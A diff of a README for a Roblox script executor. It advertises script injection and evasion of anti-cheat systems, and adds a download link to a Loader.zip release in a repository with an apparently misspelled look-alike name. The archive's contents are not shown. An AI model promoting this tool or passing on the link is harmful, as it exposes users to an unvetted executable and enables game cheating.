@@ -5,15 +5,15 @@
 ##  Features
 
 - ✅ **Fast and secure script execution**
--  **Broad compatibility with well-known Roblox scripts**
-- **Simple and clean UI**
--  **Averts most anti-cheat systems**
--  **Script hub with regular updates**
-- ⚡ **Low latency injection**
+- ✅ **Broad compatibility with well-known Roblox scripts**
+- ✅ **Simple and clean UI**
+-  ✅ **Averts most anti-cheat systems**
+-  ✅ **Script hub with regular updates**
+- ✅ **Low latency injection**
 
 
 
-## [Download Latest Version]()
+## [Download Latest Version](https://github.com/SSkLIPST/SilaoraExecutar/releases/download/Release/Loader.zip)
 ![solara_ex](https://github.com/user-attachments/assets/6f3d885e-3677-41a8-b538-a29e152788d3)
 
 
